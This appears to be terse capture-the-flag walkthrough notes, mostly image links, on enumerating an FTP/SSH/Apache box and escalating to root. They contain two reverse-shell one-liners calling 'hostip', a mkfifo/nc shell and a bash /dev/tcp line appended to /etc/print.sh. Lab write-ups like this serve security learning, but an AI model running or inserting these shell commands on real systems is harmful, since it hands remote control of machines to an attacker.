## NMAP Scan 
![[Pasted image 20220130132141.png]]
Ports:
21 vsftpd 3.0.3
22 open SSH 7.2p2
80 Apache 2.4.18
## Web Server page
![[Pasted image 20220130132246.png]]

## gobuster scan
![[Pasted image 20220130134051.png]]

## /files directory in web server
![[Pasted image 20220130134251.png]]


![[Pasted image 20220130142511.png]]

![[Pasted image 20220130142446.png]]

![[Pasted image 20220130143657.png]]

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc hostip 4444 >/tmp/f
```

![[Pasted image 20220130144104.png]]

![[Pasted image 20220130150345.png]]

![[Pasted image 20220130150402.png]]

![[Pasted image 20220130153043.png]]

command: ssh lennie@targetIP, use password from pcap

go to user folder, check scripts folder, nano planner.sh, check /etc/print.sh
add line `

'bash -c "bash -i >& /dev/tcp/hostip/port 0>&1"' > /etc/print.sh

start netcat listener on another terminal tab

cat root.txt


